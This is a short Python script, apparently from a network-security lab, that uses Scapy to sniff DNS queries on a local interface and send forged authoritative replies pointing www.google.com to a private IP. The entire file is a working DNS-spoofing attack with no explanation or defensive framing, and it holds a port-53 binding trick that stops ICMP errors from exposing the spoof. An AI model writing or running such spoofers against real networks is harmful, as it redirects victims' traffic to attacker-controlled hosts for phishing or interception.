import socket

from scapy.all import *
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import UDP, IP


# Sites that the attack will work on and their dedicated fake IP
mapping = {
    b'www.google.com.': '192.168.58.3',
}


def dns_sniffer(pkt):
    # Check if the packet is DNS
    if DNS in pkt:
        # Getting the requested domain
        qname = pkt["DNS Question Record"].qname
        # Check if the domain is in the mapping
        if qname in mapping:
            # Create the response
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=qname, ttl=10, rdata=mapping[qname]))
            # Send the spoofed packet
            send(spoofed_pkt)


def main():
    # Listening on port 53 so that ICMP won't be returned
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('192.168.58.3', 53))

    # Start sniffing
    sniff(iface="enp0s9", prn=dns_sniffer, filter="port 53")

    # Close the socket
    s.close()


if __name__ == "__main__":
    main()
